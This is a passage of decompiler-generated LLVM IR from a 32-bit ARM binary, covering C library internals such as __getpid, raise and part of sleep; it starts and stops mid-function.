  br i1 %v2_27f68, label %dec_label_pc_27fb8.loopexit, label %dec_label_pc_27f70

dec_label_pc_27f70:                               ; preds = %dec_label_pc_27f60
  %v1_27f70 = add nuw nsw i32 %v0_27f70, 1
  store i32 %v1_27f70, i32* %r2.global-to-local, align 4
  %tmp50 = icmp ult i32 %v1_27f70, 48
  br i1 %tmp50, label %dec_label_pc_27f60, label %dec_label_pc_27f7c

dec_label_pc_27f7c:                               ; preds = %dec_label_pc_27f70, %dec_label_pc_27f58
  %v1_27f7c = inttoptr i32 %v0_27f7c to i32*
  %v2_27f7c = load i32, i32* %v1_27f7c, align 4
  store i32 %v2_27f7c, i32* @r7, align 4
  %v2_27f80 = icmp eq i32 %v2_27f7c, 0
  br i1 %v2_27f80, label %dec_label_pc_27f88, label %dec_label_pc_27f58

dec_label_pc_27f88:                               ; preds = %dec_label_pc_27f7c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1348, i32* %r1.global-to-local, align 4
  %v2_27f90 = call i32 @calloc(i32 1, i32 1348)
  store i32 %v2_27f90, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_27f94 = icmp eq i32 %v2_27f90, 0
  br i1 %v2_27f94, label %bb51, label %dec_label_pc_27fa0

bb51:                                             ; preds = %dec_label_pc_27f88
  %v1_27f98 = load i32, i32* @r7, align 4
  store i32 %v1_27f98, i32* @r5, align 4
  br label %dec_label_pc_27fe8

dec_label_pc_27fa0:                               ; preds = %dec_label_pc_27f88
  store i32 26056, i32* %r2.global-to-local, align 4
  %v0_27fa4 = load i32, i32* @r6, align 4
  %v2_27fa4 = add i32 %v0_27fa4, 26056
  %v3_27fa4 = inttoptr i32 %v2_27fa4 to i32*
  %v4_27fa4 = load i32, i32* %v3_27fa4, align 4
  store i32 %v4_27fa4, i32* %r3.global-to-local, align 4
  store i32 %v2_27f90, i32* @r7, align 4
  %v2_27fac = inttoptr i32 %v2_27f90 to i32*
  store i32 %v4_27fa4, i32* %v2_27fac, align 4
  %v0_27fb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_27fb0 = load i32, i32* @r6, align 4
  %v2_27fb0 = load i32, i32* %r2.global-to-local, align 4
  %v3_27fb0 = add i32 %v2_27fb0, %v1_27fb0
  %v4_27fb0 = inttoptr i32 %v3_27fb0 to i32*
  store i32 %v0_27fb0, i32* %v4_27fb0, align 4
  store i32 47, i32* %r2.global-to-local, align 4
  %v2_27fbc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_27fb8

dec_label_pc_27fb8.loopexit:                      ; preds = %dec_label_pc_27f60
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_27fb8

dec_label_pc_27fb8:                               ; preds = %dec_label_pc_27fb8.loopexit, %dec_label_pc_27fa0
  %v2_27fbc = phi i32 [ %v0_27f7c, %dec_label_pc_27fb8.loopexit ], [ %v2_27fbc.pre, %dec_label_pc_27fa0 ]
  %v0_27fbc = phi i32 [ %v0_27f70, %dec_label_pc_27fb8.loopexit ], [ 47, %dec_label_pc_27fa0 ]
  %v3_27fbc = mul i32 %v0_27fbc, 28
  %v4_27fbc = add i32 %v3_27fbc, %v2_27fbc
  store i32 %v4_27fbc, i32* %r3.global-to-local, align 4
  %v2_27fc4 = add i32 %v4_27fbc, 24
  %v3_27fc4 = inttoptr i32 %v2_27fc4 to i32*
  store i32 1, i32* %v3_27fc4, align 4
  %v0_27fc8 = load i32, i32* %r3.global-to-local, align 4
  %v1_27fc8 = add i32 %v0_27fc8, 4
  store i32 %v1_27fc8, i32* @r5, align 4
  %v2_27fc8 = icmp ugt i32 %v0_27fc8, -5
  store i1 %v2_27fc8, i1* %cpsr_c.global-to-local, align 1
  %v7_27fc8 = icmp eq i32 %v1_27fc8, 0
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_27fd0 = add i32 %v0_27fc8, 28
  %v3_27fd0 = inttoptr i32 %v2_27fd0 to i32*
  store i32 0, i32* %v3_27fd0, align 4
  br i1 %v7_27fc8, label %dec_label_pc_27fe8, label %dec_label_pc_27fd8

dec_label_pc_27fd8:                               ; preds = %dec_label_pc_27fb8
  %v0_27fd8 = load i32, i32* @r5, align 4
  %v1_27fd8 = add i32 %v0_27fd8, 4
  %v2_27fd8 = inttoptr i32 %v1_27fd8 to i32*
  %v3_27fd8 = load i32, i32* @r8, align 4
  store i32 %v3_27fd8, i32* %v2_27fd8, align 4
  %v4_27fd8 = add i32 %v0_27fd8, 8
  %v5_27fd8 = inttoptr i32 %v4_27fd8 to i32*
  %v6_27fd8 = load i32, i32* @sb, align 4
  store i32 %v6_27fd8, i32* %v5_27fd8, align 4
  %v7_27fd8 = add i32 %v0_27fd8, 12
  %v8_27fd8 = inttoptr i32 %v7_27fd8 to i32*
  %v9_27fd8 = load i32, i32* @fp, align 4
  store i32 %v9_27fd8, i32* %v8_27fd8, align 4
  %v0_27fdc = load i32, i32* @sl, align 4
  %v1_27fdc = load i32, i32* @r5, align 4
  %v2_27fdc = add i32 %v1_27fdc, 16
  %v3_27fdc = inttoptr i32 %v2_27fdc to i32*
  store i32 %v0_27fdc, i32* %v3_27fdc, align 4
  %v0_27fe0 = load i32, i32* @r5, align 4
  store i32 %v0_27fe0, i32* %r0.global-to-local, align 4
  %v1_27fe4 = inttoptr i32 %v0_27fe0 to i32*
  %v2_27fe4 = call i32 @__linkin_atfork(i32* %v1_27fe4)
  store i32 %v2_27fe4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_27fe8

dec_label_pc_27fe8:                               ; preds = %bb51, %dec_label_pc_27fb8, %dec_label_pc_27fd8
  store i32 26052, i32* %r7.global-to-local, align 4
  %v0_27fec = load i32, i32* @r6, align 4
  %v2_27fec = add i32 %v0_27fec, 26052
  store i32 %v2_27fec, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_27ff0

dec_label_pc_27ff0:                               ; preds = %dec_label_pc_28020.dec_label_pc_27ff0_crit_edge, %dec_label_pc_27fe8
  %v0_27ff8 = phi i32 [ %v0_27ff8.pre, %dec_label_pc_28020.dec_label_pc_27ff0_crit_edge ], [ %v2_27fec, %dec_label_pc_27fe8 ]
  %v1_27ff0 = phi i32 [ %v1_27ff0.pre, %dec_label_pc_28020.dec_label_pc_27ff0_crit_edge ], [ 26052, %dec_label_pc_27fe8 ]
  %v0_27ff0 = phi i32 [ %v0_27ff0.pre, %dec_label_pc_28020.dec_label_pc_27ff0_crit_edge ], [ %v0_27fec, %dec_label_pc_27fe8 ]
  %v2_27ff0 = add i32 %v0_27ff0, %v1_27ff0
  %v3_27ff0 = inttoptr i32 %v2_27ff0 to i32*
  %v4_27ff0 = load i32, i32* %v3_27ff0, align 4
  store i32 %v4_27ff0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_27ff8, i32* %r2.global-to-local, align 4
  %v1_27ffc60 = inttoptr i32 %v0_27ff8 to i32*
  %v2_27ffc61 = load i32, i32* %v1_27ffc60, align 4
  store i32 %v2_27ffc61, i32* %r3.global-to-local, align 4
  %v3_2800063 = icmp uge i32 %v2_27ffc61, %v4_27ff0
  store i1 %v3_2800063, i1* %cpsr_c.global-to-local, align 1
  %v9_2800069 = icmp eq i32 %v2_27ffc61, %v4_27ff0
  br i1 %v9_2800069, label %dec_label_pc_28008, label %dec_label_pc_28020

dec_label_pc_28008:                               ; preds = %dec_label_pc_27ff0, %dec_label_pc_28008.dec_label_pc_27ffc_crit_edge
  %v0_2800870 = phi i32 [ %v1_28000.pre, %dec_label_pc_28008.dec_label_pc_27ffc_crit_edge ], [ %v4_27ff0, %dec_label_pc_27ff0 ]
  store i32 %v0_2800870, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_28018 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_28018, label %dec_label_pc_2801c, label %dec_label_pc_28008.dec_label_pc_27ffc_crit_edge

dec_label_pc_28008.dec_label_pc_27ffc_crit_edge:  ; preds = %dec_label_pc_28008
  %v0_27ffc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_28000.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_27ffc = inttoptr i32 %v0_27ffc.pre to i32*
  %v2_27ffc = load i32, i32* %v1_27ffc, align 4
  store i32 %v2_27ffc, i32* %r3.global-to-local, align 4
  %v3_28000 = icmp uge i32 %v2_27ffc, %v1_28000.pre
  store i1 %v3_28000, i1* %cpsr_c.global-to-local, align 1
  %v9_28000 = icmp eq i32 %v2_27ffc, %v1_28000.pre
  br i1 %v9_28000, label %dec_label_pc_28008, label %dec_label_pc_28020

dec_label_pc_2801c:                               ; preds = %dec_label_pc_28008
  %v0_2801c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_2801c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_28020

dec_label_pc_28020:                               ; preds = %dec_label_pc_27ff0, %dec_label_pc_28008.dec_label_pc_27ffc_crit_edge, %dec_label_pc_2801c
  %v0_28028 = phi i32 [ %v0_2801c, %dec_label_pc_2801c ], [ %v2_27ffc61, %dec_label_pc_27ff0 ], [ %v2_27ffc, %dec_label_pc_28008.dec_label_pc_27ffc_crit_edge ]
  %v1_28020 = phi i32 [ %v0_2801c, %dec_label_pc_2801c ], [ %v4_27ff0, %dec_label_pc_27ff0 ], [ %v1_28000.pre, %dec_label_pc_28008.dec_label_pc_27ffc_crit_edge ]
  %v3_28020 = icmp uge i32 %v0_28028, %v1_28020
  store i1 %v3_28020, i1* %cpsr_c.global-to-local, align 1
  %v9_28020 = icmp eq i32 %v0_28028, %v1_28020
  br i1 %v9_28020, label %dec_label_pc_28028, label %dec_label_pc_28020.dec_label_pc_27ff0_crit_edge

dec_label_pc_28020.dec_label_pc_27ff0_crit_edge:  ; preds = %dec_label_pc_28020
  %v0_27ff0.pre = load i32, i32* @r6, align 4
  %v1_27ff0.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_27ff8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_27ff0

dec_label_pc_28028:                               ; preds = %dec_label_pc_28020
  %v2_28028 = icmp ne i32 %v1_28020, 0
  store i1 %v2_28028, i1* %cpsr_c.global-to-local, align 1
  %v7_2802c = icmp slt i32 %v1_28020, 2
  br i1 %v7_2802c, label %dec_label_pc_28048, label %dec_label_pc_28030

dec_label_pc_28030:                               ; preds = %dec_label_pc_28028
  %v0_28030 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_28030, i32* %r0.global-to-local, align 4
  %v0_28034 = load i32, i32* %r1.global-to-local, align 4
  %v1_28034 = add i32 %v0_28034, 129
  store i32 %v1_28034, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_28048

dec_label_pc_28048:                               ; preds = %dec_label_pc_28030, %dec_label_pc_28028
  %v0_28048 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_28048 = icmp eq i32 %v0_28048, 0
  %. = select i1 %v2_28048, i32 12, i32 0
  store i32 %., i32* %r0.global-to-local, align 4
  store i32 %v3_27ee8, i32* %r4.global-to-local, align 4
  store i32 %v12_27ee8, i32* %r7.global-to-local, align 4
  store i32 %v15_27ee8, i32* %r8.global-to-local, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v0_2801c, { 1, 0, 2 }
  uselistorder i32 %v1_28000.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v2_27f90, { 1, 0, 2, 3 }
  uselistorder i32 %v2_27f7c, { 1, 2, 0 }
  uselistorder i32 %v1_27f70, { 1, 2, 0 }
  uselistorder i32 %v0_27f70, { 0, 2, 1 }
  uselistorder i32 %v0_27f7c, { 0, 2, 1 }
  uselistorder i32 %v0_27f58.pre, { 0, 2, 1 }
  uselistorder i32 %v0_27f3c, { 1, 0, 2 }
  uselistorder i32 %v1_27f20.pre, { 0, 3, 2, 1 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 14, 5, 6, 7, 8, 9, 10, 11, 13, 12, 15, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 2, 3, 5, 4, 9, 10, 6, 7, 8, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 3, 10, 11, 4, 8, 5, 9, 6, 7, 12, 13 }
  uselistorder i32 26056, { 0, 2, 1, 3 }
  uselistorder i32 26052, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_28020, { 2, 1, 0 }
  uselistorder label %dec_label_pc_28008, { 1, 0 }
  uselistorder label %dec_label_pc_27fe8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_27f60, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_27f40, { 2, 1, 0 }
  uselistorder label %dec_label_pc_27f28, { 1, 0 }
}

define i32 @function_28064(i32 %arg1) local_unnamed_addr {
dec_label_pc_28064:
  %v0_28064 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_28064, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_28064
  %v2_28064 = load i32, i32* @r4, align 4
  %v5_2806c = sdiv i32 %v2_28064, 1024
  %v6_2806c = and i32 %v5_2806c, %arg1
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_28064, %bb
  %v7_2806c = phi i32 [ %arg1, %dec_label_pc_28064 ], [ %v6_2806c, %bb ]
  ret i32 %v7_2806c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__getpid() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_28070 = load i32, i32* @r7, align 4
  store i32 %v3_28070, i32* %stack_var_-8, align 4
  %v0_28074 = call i32 @__aeabi_read_tp()
  store i32 %v0_28074, i32* %r0.global-to-local, align 4
  %v1_28078 = add i32 %v0_28074, -1060
  %v2_28078 = inttoptr i32 %v1_28078 to i32*
  %v3_28078 = load i32, i32* %v2_28078, align 4
  %tmp7 = icmp slt i32 %v3_28078, 1
  br i1 %tmp7, label %dec_label_pc_28088, label %dec_label_pc_280ac

dec_label_pc_28088:                               ; preds = %entry
  %v2_2807c = icmp eq i32 %v3_28078, 0
  br i1 %v2_2807c, label %dec_label_pc_2808c, label %dec_label_pc_28098

dec_label_pc_2808c:                               ; preds = %dec_label_pc_28088
  %v1_2808c = add i32 %v0_28074, -1064
  %v2_2808c = inttoptr i32 %v1_2808c to i32*
  %v3_2808c = load i32, i32* %v2_2808c, align 4
  store i32 %v3_2808c, i32* %r0.global-to-local, align 4
  %v2_28090 = icmp eq i32 %v3_2808c, 0
  br i1 %v2_28090, label %bb, label %bb8

dec_label_pc_28098:                               ; preds = %dec_label_pc_28088
  br label %bb8

bb:                                               ; preds = %dec_label_pc_2808c
  store i32 0, i32* %v2_2808c, align 4
  %v0_280a8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_28098, %dec_label_pc_2808c, %bb
  %v0_280a8 = phi i32 [ %v3_2808c, %dec_label_pc_2808c ], [ %v0_28074, %dec_label_pc_28098 ], [ %v0_280a8.pre, %bb ]
  br label %dec_label_pc_280ac

dec_label_pc_280ac:                               ; preds = %entry, %bb8
  %v0_280ac = phi i32 [ %v3_28078, %entry ], [ %v0_280a8, %bb8 ]
  store i32 %v0_280ac, i32* %r0.global-to-local, align 4
  %v2_280b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_280b0, i32* @r7, align 4
  ret i32 %v0_280ac

; uselistorder directives
  uselistorder i32 %v0_280ac, { 1, 0 }
  uselistorder i32 %v3_28078, { 1, 2, 0 }
  uselistorder label %dec_label_pc_280ac, { 1, 0 }
  uselistorder label %bb8, { 2, 0, 1 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_280b8 = load i32, i32* @r4, align 4
  store i32 %v3_280b8, i32* %stack_var_-20, align 4
  %v0_280c0 = call i32 @__aeabi_read_tp()
  store i32 %v0_280c0, i32* %r0.global-to-local, align 4
  %v1_280c4 = add i32 %v0_280c0, -1064
  %v2_280c4 = inttoptr i32 %v1_280c4 to i32*
  %v3_280c4 = load i32, i32* %v2_280c4, align 4
  store i32 %v3_280c4, i32* %r4.global-to-local, align 4
  %v2_280c8 = icmp eq i32 %v3_280c4, 0
  %v1_280d0 = add i32 %v0_280c0, -1060
  %v2_280d0 = inttoptr i32 %v1_280d0 to i32*
  %v3_280d0 = load i32, i32* %v2_280d0, align 4
  store i32 %v3_280d0, i32* %r0.global-to-local, align 4
  br i1 %v2_280c8, label %dec_label_pc_280d8, label %dec_label_pc_280ec

dec_label_pc_280d8:                               ; preds = %entry
  store i32 %v3_280d0, i32* %r4.global-to-local, align 4
  store i32 %v3_280d0, i32* %v2_280c4, align 4
  %v0_28114.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb28

dec_label_pc_280ec:                               ; preds = %entry
  %v5_280f0 = icmp sgt i32 %v3_280d0, 0
  br i1 %v5_280f0, label %bb28, label %dec_label_pc_280f4

dec_label_pc_280f4:                               ; preds = %dec_label_pc_280ec
  %tmp = bitcast i32 %v3_280d0 to float
  %tmp30 = call float @fabsf(float %tmp)
  %v1_280f4 = bitcast float %tmp30 to i32
  %v2_280f8 = icmp eq i32 %v1_280f4, 0
  br i1 %v2_280f8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_280f4
  store i32 %v3_280c4, i32* %r0.global-to-local, align 4
  br label %bb28

.thread:                                          ; preds = %dec_label_pc_280f4
  %v2_28100 = sub i32 0, %v3_280d0
  store i32 %v2_28100, i32* %r0.global-to-local, align 4
  br label %bb28

bb28:                                             ; preds = %bb, %dec_label_pc_280ec, %dec_label_pc_280d8, %.thread
  %v0_28118 = phi i32 [ %v3_280d0, %dec_label_pc_280ec ], [ %v0_28114.pre, %dec_label_pc_280d8 ], [ %v3_280c4, %bb ], [ %v2_28100, %.thread ]
  store i32 %v0_28118, i32* %r2.global-to-local, align 4
  %tmp31 = icmp ult i32 %v0_28118, -4095
  br i1 %tmp31, label %dec_label_pc_2813c, label %dec_label_pc_28124

dec_label_pc_28124:                               ; preds = %bb28
  %v0_28128 = call i32 @__aeabi_read_tp()
  %v3_2812c = load i16, i16* @global_var_42934.3040, align 2
  %v4_2812c = sext i16 %v3_2812c to i32
  %v0_28130 = load i32, i32* %r2.global-to-local, align 4
  %v1_28130 = sub i32 0, %v0_28130
  store i32 %v1_28130, i32* %r2.global-to-local, align 4
  %v3_28134 = add i32 %v4_2812c, %v0_28128
  %v4_28134 = inttoptr i32 %v3_28134 to i32*
  store i32 %v1_28130, i32* %v4_28134, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2813c

dec_label_pc_2813c:                               ; preds = %bb28, %dec_label_pc_28124
  %v0_28140 = phi i32 [ %v0_28118, %bb28 ], [ -1, %dec_label_pc_28124 ]
  %v3_2813c = icmp eq i32 %v0_28140, -1
  store i32 %v0_28140, i32* %r5.global-to-local, align 4
  br i1 %v3_2813c, label %dec_label_pc_28148, label %dec_label_pc_28190

dec_label_pc_28148:                               ; preds = %dec_label_pc_2813c
  %v0_2814c = call i32 @__aeabi_read_tp()
  store i32 %v0_2814c, i32* %r0.global-to-local, align 4
  %v3_28150 = load i16, i16* @global_var_42934.3040, align 2
  %v4_28150 = sext i16 %v3_28150 to i32
  %v2_28154 = add i32 %v4_28150, %v0_2814c
  %v3_28154 = inttoptr i32 %v2_28154 to i32*
  %v4_28154 = load i32, i32* %v3_28154, align 4
  %v7_28158 = icmp eq i32 %v4_28154, 38
  br i1 %v7_28158, label %dec_label_pc_28164, label %dec_label_pc_28148.dec_label_pc_28190_crit_edge

dec_label_pc_28148.dec_label_pc_28190_crit_edge:  ; preds = %dec_label_pc_28148
  %v0_28190.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_28190

dec_label_pc_28164:                               ; preds = %dec_label_pc_28148
  %v0_28164 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_28164, i32* %r0.global-to-local, align 4
  %tmp32 = icmp ugt i32 %v0_28164, -4096
  br i1 %tmp32, label %bb29, label %.thread22

bb29:                                             ; preds = %dec_label_pc_28164
  %v5_2817c = sub i32 0, %v0_28164
  store i32 %v5_2817c, i32* %r2.global-to-local, align 4
  %v7_28180 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1a7ac.2127 to i32), i32 ptrtoint (i32* @global_var_28188.3302 to i32)) to i32*), align 4
  %v4_28184 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v4_28184, i32* %r0.global-to-local, align 4
  %v7_28188 = add i32 %v7_28180, %v0_2814c
  %v8_28188 = inttoptr i32 %v7_28188 to i32*
  store i32 %v5_2817c, i32* %v8_28188, align 4
  %v0_2818c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread22

.thread22:                                        ; preds = %dec_label_pc_28164, %bb29
  %v0_2818c = phi i32 [ %v0_2818c.pre, %bb29 ], [ %v0_28164, %dec_label_pc_28164 ]
  store i32 %v0_2818c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_28190

dec_label_pc_28190:                               ; preds = %dec_label_pc_28148.dec_label_pc_28190_crit_edge, %dec_label_pc_2813c, %.thread22
  %v0_28190 = phi i32 [ %v0_28190.pre, %dec_label_pc_28148.dec_label_pc_28190_crit_edge ], [ %v0_28140, %dec_label_pc_2813c ], [ %v0_2818c, %.thread22 ]
  store i32 %v0_28190, i32* %r0.global-to-local, align 4
  %v2_28194 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_28194, i32* @r4, align 4
  ret i32 %v0_28190

; uselistorder directives
  uselistorder i32 %v0_28190, { 1, 0 }
  uselistorder i32 %v0_28164, { 1, 2, 0, 3 }
  uselistorder i32 %v0_28118, { 2, 0, 1 }
  uselistorder i32 %v3_280d0, { 2, 1, 0, 5, 4, 3, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 38, { 3, 2, 0, 1 }
  uselistorder i32 -1060, { 2, 0, 1 }
  uselistorder i32 -1064, { 1, 0 }
  uselistorder label %dec_label_pc_28190, { 2, 0, 1 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_2813c, { 1, 0 }
  uselistorder label %bb28, { 3, 0, 1, 2 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_281a8 = load i32, i32* @r4, align 4
  %v6_281a8 = load i32, i32* @r5, align 4
  %v9_281a8 = load i32, i32* @r6, align 4
  %v12_281a8 = load i32, i32* @r7, align 4
  %v15_281a8 = load i32, i32* @lr, align 4
  store i32 0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_281b8 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r7, align 4
  store i32 %arg1, i32* %stack_var_-32, align 4
  br i1 %v2_281b8, label %dec_label_pc_281cc, label %dec_label_pc_28240

dec_label_pc_281cc:                               ; preds = %entry
  %v0_281cc = call i32 @__aeabi_read_tp()
  %v1_281d0 = add i32 %v0_281cc, -1036
  %v2_281d0 = inttoptr i32 %v1_281d0 to i32*
  %v3_281d0 = load i32, i32* %v2_281d0, align 4
  %v1_281d4 = and i32 %v3_281d0, -71
  %v2_281d8 = icmp ugt i32 %v1_281d4, 7
  store i1 %v2_281d8, i1* %cpsr_c.global-to-local, align 1
  %v7_281d8 = icmp eq i32 %v1_281d4, 8
  %v1_281dc = add i32 %v0_281cc, -1168
  store i32 %v1_281dc, i32* @r5, align 4
  br i1 %v7_281d8, label %dec_label_pc_281e4, label %dec_label_pc_282b8

dec_label_pc_281e4:                               ; preds = %dec_label_pc_281cc
  %v2_281e8 = add i32 %v0_281cc, -624
  %v3_281e8 = inttoptr i32 %v2_281e8 to i32*
  store i32 -1, i32* %v3_281e8, align 4
  %v0_281ec = load i32, i32* @r5, align 4
  %v1_281ec = add i32 %v0_281ec, 132
  store i32 %v1_281ec, i32* @r6, align 4
  br label %dec_label_pc_281f0

dec_label_pc_281f0:                               ; preds = %dec_label_pc_28224.dec_label_pc_281f0_crit_edge, %dec_label_pc_281e4
  %v0_281f4 = phi i32 [ %v0_281f4.pre, %dec_label_pc_28224.dec_label_pc_281f0_crit_edge ], [ %v1_281ec, %dec_label_pc_281e4 ]
  %v0_281f0 = phi i32 [ %v0_2822c, %dec_label_pc_28224.dec_label_pc_281f0_crit_edge ], [ %v0_281ec, %dec_label_pc_281e4 ]
  %v1_281f0 = add i32 %v0_281f0, 132
  %v2_281f0 = inttoptr i32 %v1_281f0 to i32*
  %v3_281f0 = load i32, i32* %v2_281f0, align 4
  store i32 %v0_281f4, i32* %r2.global-to-local, align 4
  store i32 %v3_281f0, i32* @r4, align 4
  %v1_2820030 = inttoptr i32 %v0_281f4 to i32*
  %v2_2820031 = load i32, i32* %v1_2820030, align 4
  %v3_2820433 = icmp uge i32 %v2_2820031, %v3_281f0
  store i1 %v3_2820433, i1* %cpsr_c.global-to-local, align 1
  %v9_2820439 = icmp eq i32 %v2_2820031, %v3_281f0
  br i1 %v9_2820439, label %dec_label_pc_2820c, label %dec_label_pc_28224

dec_label_pc_2820c:                               ; preds = %dec_label_pc_281f0, %dec_label_pc_2820c.dec_label_pc_28200_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_2821c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_2821c, label %dec_label_pc_28220, label %dec_label_pc_2820c.dec_label_pc_28200_crit_edge

dec_label_pc_2820c.dec_label_pc_28200_crit_edge:  ; preds = %dec_label_pc_2820c
  %v0_28200.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_28204.pre = load i32, i32* @r4, align 4
  %v1_28200 = inttoptr i32 %v0_28200.pre to i32*
  %v2_28200 = load i32, i32* %v1_28200, align 4
  %v3_28204 = icmp uge i32 %v2_28200, %v1_28204.pre
  store i1 %v3_28204, i1* %cpsr_c.global-to-local, align 1
  %v9_28204 = icmp eq i32 %v2_28200, %v1_28204.pre
  br i1 %v9_28204, label %dec_label_pc_2820c, label %dec_label_pc_28224

dec_label_pc_28220:                               ; preds = %dec_label_pc_2820c
  %v0_28220 = load i32, i32* @r4, align 4
  br label %dec_label_pc_28224

dec_label_pc_28224:                               ; preds = %dec_label_pc_281f0, %dec_label_pc_2820c.dec_label_pc_28200_crit_edge, %dec_label_pc_28220
  %v0_28224 = phi i32 [ %v0_28220, %dec_label_pc_28220 ], [ %v2_2820031, %dec_label_pc_281f0 ], [ %v2_28200, %dec_label_pc_2820c.dec_label_pc_28200_crit_edge ]
  %v1_28224 = phi i32 [ %v0_28220, %dec_label_pc_28220 ], [ %v3_281f0, %dec_label_pc_281f0 ], [ %v1_28204.pre, %dec_label_pc_2820c.dec_label_pc_28200_crit_edge ]
  %v3_28224 = icmp uge i32 %v0_28224, %v1_28224
  store i1 %v3_28224, i1* %cpsr_c.global-to-local, align 1
  %v9_28224 = icmp eq i32 %v0_28224, %v1_28224
  br i1 %v9_28224, label %dec_label_pc_2822c, label %dec_label_pc_28224.dec_label_pc_281f0_crit_edge

dec_label_pc_28224.dec_label_pc_281f0_crit_edge:  ; preds = %dec_label_pc_28224
  %v0_2822c = load i32, i32* @r5, align 4
  %v0_281f4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_281f0

dec_label_pc_2822c:                               ; preds = %dec_label_pc_28224
  %v0_28234 = load i32, i32* @r7, align 4
  %v2_28234 = add i32 %v0_28234, 128
  %v3_28234 = inttoptr i32 %v2_28234 to i32*
  %v4_28234 = load i32, i32* %v3_28234, align 4
  store i32 164416, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_28234)
  %v0_28248.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_28240

dec_label_pc_28240:                               ; preds = %entry, %dec_label_pc_2822c
  %v0_28248 = phi i32 [ 0, %entry ], [ %v0_28248.pre, %dec_label_pc_2822c ]
  %v2_2824c = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_2824c, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %stack_var_-40, align 4
  %v3_28258 = call i32 @__libc_sigaction(i32 17, i32 %v0_28248, i32 %v2_2824c)
  %v3_2825c = load i32, i32* %stack_var_-60, align 4
  %v2_28260 = icmp ne i32 %v3_2825c, 0
